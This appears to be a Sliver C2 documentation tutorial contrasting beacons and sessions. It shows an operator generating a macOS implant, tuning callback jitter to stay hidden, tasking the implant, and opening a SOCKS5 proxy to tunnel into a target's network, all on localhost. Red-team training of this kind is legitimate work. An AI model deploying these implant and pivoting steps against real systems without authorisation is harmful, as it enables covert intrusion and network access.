# Beacons vs Sessions

Sliver implants support two types of connections, sessions and beacons.

Sessions use long-poling connections, which means they use a single TCP connection which is constantly open. Beacons on the other hand call back periodically, and will sleep when not active which can help keep their presence hidden.

Typically during an engagement you will want to deploy a beacon on the target system, and switch to a session while doing more active enumeration activities.

Let’s start with generating and deploying a beacon using `http`.

```bash
[server] sliver > http

[*] Starting HTTP :80 listener ...
[*] Successfully started job #1

[server] sliver > generate beacon -b localhost --skip-symbols --debug --os macos

[*] Generating new darwin/amd64 beacon implant binary (1m0s)
[*] Build completed in 4s
[*] Implant saved to /Users/tester/tools/TIRED_GIRAFFE

[*] Beacon 942c647c TIRED_GIRAFFE - 127.0.0.1:51803 (tester.local) - darwin/amd64 - Wed, 19 Apr 2023 01:14:21 CEST
```

You can see the beacon callback times either in the `info` command or using `beacons watch`.

```bash
[server] sliver > beacons watch

 ID         Name            Transport   Username          Operating System   Last Check-In   Next Check-In
========== =============== =========== ================= ================== =============== ===============
 942c647c   TIRED_GIRAFFE   http(s)     tester   darwin/amd64       52s             12s

```

Beacon callback times and jitter can be set either during generation or on the fly using the `reconfig` command. You can also modify the default values in the sliver http c2 configuration in `.sliver/configs/http-c2.json`. 

The example below sets the callback time to 5s with a 1s jitter.

```bash
[server] sliver (TIRED_GIRAFFE) > reconfig -i 5s -j 1s

[*] Tasked beacon TIRED_GIRAFFE (b8aa6fd8)

[+] TIRED_GIRAFFE completed task b8aa6fd8

[*] Reconfigured beacon

[server] sliver (TIRED_GIRAFFE) > info

         Beacon ID: 942c647c-8409-4877-9fa2-b84a7f27ad45
              Name: TIRED_GIRAFFE
          Hostname: tester.local
              UUID: c6de1a44-016a-5fbe-b76a-da56af41316d
          Username: tester
               UID: 501
               GID: 20
               PID: 55879
                OS: darwin
           Version:
            Locale:
              Arch: amd64
         Active C2: https://127.0.0.1
    Remote Address: 127.0.0.1:51803
         Proxy URL:
          Interval: 1m0s
            Jitter: 30s
     First Contact: Wed Apr 19 01:14:21 CEST 2023 (10m30s ago)
      Last Checkin: Wed Apr 19 01:18:20 CEST 2023 (6m31s ago)
      Next Checkin: Wed Apr 19 01:19:46 CEST 2023 (5m5s ago)
```

Commands issued for beacons can be viewed using `tasks`, the task state will indicate wether the command has completed or not.  The results of previously run tasks can be viewed using `tasks fetch`.

```bash
[server] sliver > use

? Select a session or beacon: BEACON  5d38eba7  TIRED_GIRAFFE   127.0.0.1:50224  tester.local  tester  darwin/amd64
[*] Active beacon TIRED_GIRAFFE (5d38eba7-3166-47b4-8bdc-757f92bfe2d5)

[server] sliver (TIRED_GIRAFFE) > pwd

[*] Tasked beacon TIRED_GIRAFFE (f26b9928)

[server] sliver (TIRED_GIRAFFE) > tasks

 ID         State     Message Type   Created                          Sent   Completed
========== ========= ============== ================================ ====== ===========
 f26b9928   pending   Pwd            Thu, 20 Apr 2023 23:48:27 CEST

[+] TIRED_GIRAFFE completed task f26b9928

[*] /Users/tester

[server] sliver (TIRED_GIRAFFE) > tasks fetch

+------------------------------------------------------+
| Beacon Task   | f26b9928-9807-4c33-8acd-0b9cbf46b3e7 |
+---------------+--------------------------------------+
| State         | ✅ Completed                         |
| Description   | PwdReq                               |
| Created       | Thu, 20 Apr 2023 23:48:27 CEST       |
| Sent          | Thu, 20 Apr 2023 23:49:24 CEST       |
| Completed     | Thu, 20 Apr 2023 23:49:24 CEST       |
| Request Size  | 15 B                                 |
| Response Size | 30 B                                 |
+------------------------------------------------------+

[*] /Users/tester
```

Session can be spun up using the `interractive` command.

```bash
[server] sliver (TIRED_GIRAFFE) > interactive

[*] Using beacon's active C2 endpoint: https://127.0.0.1
[*] Tasked beacon TIRED_GIRAFFE (c963101c)

[*] Session 131a60b9 TIRED_GIRAFFE - 127.0.0.1:51969 (tester.local) - darwin/amd64 - Wed, 19 Apr 2023 01:27:27 CEST

[server] sliver (TIRED_GIRAFFE) > sessions

 ID         Transport   Remote Address    Hostname                 Username          Operating System   Health
========== =========== ================= ======================== ================= ================== =========
 131a60b9   http(s)     127.0.0.1:51969   tester.local   tester   darwin/amd64       [ALIVE]
```

Because of the differences between sessions and beacons, certain commands like `upload` or `download` are slower on beacons due to the callback time. Others such as socks5 are not supported and only allowed for sessions. As a rule of thumb anything requiring higher network bandwith should be run from a session.

Let’s switch to our newly created session and spin-up a `socks5` proxy.

```bash
[server] sliver (TIRED_GIRAFFE) > use

? Select a session or beacon: SESSION  131a60b9  TIRED_GIRAFFE  127.0.0.1:51969  tester.local  tester  darwin/amd64
[*] Active session TIRED_GIRAFFE (131a60b9-db4f-4913-9064-18a17a0f09ab)

[server] sliver (TIRED_GIRAFFE) > socks5 start

[*] Started SOCKS5 127.0.0.1 1081
⚠️  In-band SOCKS proxies can be a little unstable depending on protocol
```

You can then point your browser to port 1081 to tunnel traffic through the implant to your target’s local network.

Try out some of the previous commands and compare behaviour on beacons and sessions. Once you are done, you should remember to close your session using the `close` command.
